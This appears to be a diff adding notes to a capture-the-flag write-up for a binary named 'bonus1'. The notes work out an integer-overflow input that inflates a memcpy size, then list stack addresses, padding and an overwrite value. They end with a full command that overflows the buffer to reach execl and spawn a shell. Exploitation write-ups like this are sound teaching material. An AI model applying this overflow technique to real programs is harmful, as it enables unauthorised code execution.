@@ -3,3 +3,21 @@ There is only main function
 
 Executing, it seems to segfault without argument and it doesn't with at least 1 arg
 see reverse_engineer.c
+
+delphin calculations + some tweaking: -1073741814 as input gives 40 to memcpy
+
+buffer start: 0xbffff6b0
+address we need to overwrite : 0xbffff6ec
+
+padding to reach address : 0x3C (60)
+-1073741809 gives 60 to memcpy size
+
+after messing around, it seems that we need 40 bytes to reach address:
+
+-1073741809
+"A"*40 + "\x46\x4c\x4f\x57"
+
+These values work and we successfully get into the execl, we thought the "sh" argument had to be a file, but nope it works as if and opens a shell
+
+final command:
+./bonus1 -1073741809 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
